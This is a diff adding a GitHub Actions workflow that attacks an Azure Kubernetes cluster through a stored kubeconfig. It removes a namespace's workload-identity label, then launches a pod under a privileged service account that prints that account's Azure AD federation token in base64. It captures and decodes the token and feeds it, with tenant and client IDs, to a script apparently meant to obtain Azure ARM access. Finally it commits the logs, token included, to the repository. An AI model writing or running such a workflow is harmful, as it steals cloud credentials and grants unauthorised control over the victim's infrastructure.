@@ -1,0 +1,77 @@
+name: ulwi7
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: wi
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=20s"
+          {
+            POD=$($KX get pods -n wallet-billing -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.containers[0].image}{" "}{.spec.nodeName}{"\n"}{end}' | grep 'azurecr.io' | head -1)
+            IMG=$(echo "$POD" | awk '{print $2}'); NODE=$(echo "$POD" | awk '{print $3}')
+            echo "USE $IMG $NODE"
+            $KX label ns wallet-billing azure-workload-identity.io/namespace- 2>&1
+            cat > /tmp/wi.yaml <<'EOF'
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulwi7
+            namespace: wallet-billing
+          spec:
+            nodeName: __NODE__
+            restartPolicy: Never
+            serviceAccountName: control-sync-apply
+            automountServiceAccountToken: false
+            containers:
+            - name: c
+              image: __IMG__
+              imagePullPolicy: IfNotPresent
+              volumeMounts:
+              - name: tok
+                mountPath: /var/run/secrets/azure/tokens
+                readOnly: true
+              command: ["/bin/sh","-c"]
+              args:
+              - echo TOKB64=$(base64 /var/run/secrets/azure/tokens/azure-identity-token | tr -d '\n')
+            volumes:
+            - name: tok
+              projected:
+                sources:
+                - serviceAccountToken:
+                    audience: api://AzureADTokenExchange
+                    expirationSeconds: 3600
+                    path: azure-identity-token
+          EOF
+            sed -i "s|__NODE__|$NODE|; s|__IMG__|$IMG|" /tmp/wi.yaml
+            cat /tmp/wi.yaml
+            $KX apply -f /tmp/wi.yaml 2>&1 | grep -v '^Warning'
+            $KX label ns wallet-billing azure-workload-identity.io/namespace=true 2>&1
+            for i in $(seq 1 14); do sleep 10; S=$($KX get pod -n wallet-billing ulwi7 -o jsonpath='{.status.phase}' 2>&1); echo "WISTATE$i $S"; echo "$S" | grep -qE 'Succeeded|Failed' && break; done
+            LOGS=""
+            for j in $(seq 1 6); do L=$($KX logs -n wallet-billing ulwi7 2>&1); echo "LOGLEN ${#L}"; echo "$L" | head -c 200; echo; LOGS="$LOGS
+$L"; echo "$L" | grep -q 'TOKB64=ey' && break; sleep 10; done
+            TB=$(echo "$LOGS" | grep -o 'TOKB64=[A-Za-z0-9+/=]*' | head -1 | cut -d= -f2-)
+            echo "TB_LEN ${#TB}"
+            echo -n "$TB" | base64 -d > /tmp/assertion.txt 2>/dev/null
+            echo "ASSERT_LEN $(wc -c < /tmp/assertion.txt)"
+            CID=$($KX get sa -n wallet-billing control-sync-apply -o jsonpath='{.metadata.annotations.azure\.workload\.identity/client-id}')
+            echo "CID=$CID"
+            if [ -s /tmp/assertion.txt ]; then TID=62974d97-13b6-40c9-8576-f1ab2905b6cf CID="$CID" ASSERTION="$(cat /tmp/assertion.txt)" python3 ul/wi/arm2.py 2>&1 | head -60; fi
+          } 2>&1 | tee wi7.txt
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulwi7 $(date -u +%s)"
+          git push
